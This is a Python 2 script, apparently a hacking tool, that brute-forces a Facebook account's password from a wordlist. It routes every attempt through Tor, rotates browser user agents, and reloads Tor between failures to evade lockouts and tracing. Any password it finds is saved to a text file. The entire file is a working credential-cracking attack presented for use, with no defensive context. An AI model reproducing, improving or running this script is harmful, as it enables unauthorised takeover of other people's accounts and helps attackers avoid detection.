#!/usr/bin/env python 2.7.12
#
#
# Author: abdesalam belmerabet
# Distro:  Kali Linux 2.0 
import os
import sys
import time
import socks
import socket
import random
import cookielib
import mechanize
from mechanize import Browser

#Colors
#########################
Red =    '\033[0;31;48m'#
Blue =   '\033[0;34;48m'#
Green =  '\033[0;32;48m'#
Yellow = '\033[0;33;48m'#
White =  '\033[0;37;48m'#
#########################



	
	
if os.getuid() != 0:
	os.system('clear');time.sleep(0.7);print '[!] run with root access';time.sleep(0.7);sys.exit()

#Access Granted list
def Access(Email,Password):
	try:
		Access = open('/root/Desktop/teclamb.blogspot.com.txt','a')
	except:
		os.system('touch /root/Desktop/teclamb.blogspot.com.txt')
		Access = open('/root/Desktop/teclamb.blogspot.com.txt','a')

	Access.write('Email: %s\nPass:  %s\n'%(Email,Password))

if os.path.exists('/usr/bin/tor') is False:
	os.system('clear');time.sleep(0.7);print '[!] Installing Tor *Configure After';time.sleep(0.7);
	os.system('apt-get install tor -y')
def Display():
	Sign = '''%s
    / \      | |__   ___| |_ __ ___   ___ _ __ __ _| |__   ___| |_ 
  / _ \     | '_ \ / _ \ | '_ ` _ \ / _ \ '__/ _` | '_ \ / _ \ __|
 / ___ \ _  | |_) |  __/ | | | | | |  __/ | | (_| | |_) |  __/ |_ 
/_/   \_(_) |_.__/ \___|_|_| |_| |_|\___|_|  \__,_|_.__/ \___|\__|
                                                             
\n\nBy: Abdesalam belmerabet\n\n'''%Blue
	
	print Sign

#User 
try:
	os.system('clear');Display();print '%s '%Red
	Email = raw_input('Enter Email: ');time.sleep(0.7)
	if len(Email) is 0:
		os.system('clear');print 'You Left Email Field Empty';time.sleep(3);sys.exit()

	Passlist = raw_input('\nEnter Passlist: ');time.sleep(3)
	if len(Passlist) is 0:
		os.system('clear');print 'You Left Password Field Empty';time.sleep(3);sys.exit()
	if os.path.exists(Passlist) is False:
		os.system('clear');print "Can't Open %s"%Passlist;time.sleep(3);sys.exit()
except:
	os.system('clear')
	print '%s[%s!%s]%s Exiting...' %(Yellow,Red,Yellow,Red)
	os.system('service tor stop');time.sleep(0.9);sys.exit()

#Start Tor
os.system('service tor start');time.sleep(2)

#Set Sockets
def create_connection(address, timeout=None, source_address=None):
    sock = socks.socksocket()
    sock.connect(address)
    return sock
try:
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)

	socket.socket = socks.socksocket
	socket.create_connection = create_connection
except:
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, "127.0.0.1", 9050)

	socket.socket = socks.socksocket
	socket.create_connection = create_connection

#Headers
useragents = [( 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
	        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36',
	        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36',
		'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36'
                
             )]
  
#Browser  
Br = Browser()
Br = mechanize.Browser()
cj = cookielib.LWPCookieJar()
Br.set_handle_robots(False)
Br.set_handle_equiv(True)
Br.set_handle_referer(True)
Br.set_handle_redirect(True)
Br.set_cookiejar(cj)
Br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)


Passwords = open(Passlist,'r');

Email = Email.replace('\n','')
Url = 'https://beta.facebook.com/login.php?'

Attempt = 1
Pass = open(Passlist,'r')
List = Pass.readlines()
load = len(List)
print load
for Password in Passwords:
	try:
		
		Password = Password.replace('\n','')
		if Attempt is 8:
			time.sleep(30)
		os.system('clear');Display()
		for i in range(10):
			print '\n'
		print '\n\n%s[%s!%s]%s Cracking'          %(Yellow,Red,Yellow,Red)
		print "%s[%s-%s]%s Loaded:%s %s" %(Yellow,Blue,Yellow,Blue,Red,load)
		print "%s[%s-%s]%s Email:%s %s" %(Yellow,Blue,Yellow,Blue,Red,Email)     
		print "%s[%s-%s]%s Validating: %s%s" %(Yellow,Blue,Yellow,Blue,Red,Password)
		print "%s[%s-%s]%s Attempt %s#%s: %s%d" %(Yellow,Blue,Yellow,Blue,Red,Blue,Blue,Attempt) 
		Br.addheaders = [('User-agent', random.choice(useragents))]
		def Found():
			
			os.system("clear");Display()
			for i in range(11):
				print '\n'
			Access(Email,Password)
			print "%s[%s!%s] %sAccess Granted " %(Yellow,Red,Yellow,Blue)
			print "%s[%s-%s]%s Attempt %s#: %s%d" %(Yellow,Blue,Yellow,Red,Blue,Red,Attempt) 
			print "%s[%s-%s]%s Login: %s[%s %s %s]" %(Yellow,Blue,Yellow,Red,Yellow,Green,Email,Yellow)
			print "%s[%s-%s]%s Password: %s[%s %s %s]%s" %(Yellow,Blue,Yellow,Red,Yellow,Green,Password,Yellow,White)
			print "%s[%s-%s]%s Password Saved To: %s/Desktop/teclamb.blogspot.com.txt\n" %(Yellow,Red,Yellow,Blue,Red)
			os.system("service tor stop")
		Site = Br.open(Url)
		Br.select_form(nr=0)
		Br.form['email'] = Email
		Br.form['pass'] = Password
		Enter = Br.submit()
		Login = Br.geturl()
		if 'login' not in Login:
			Found()
			break

		else:
			os.system('service tor reload');time.sleep(3);Attempt+=1
	except:
		os.system('clear')
		print '%s[%s!%s]%s Exiting...' %(Yellow,Red,Yellow,Red)
		os.system('service tor stop');time.sleep(0.9);sys.exit()

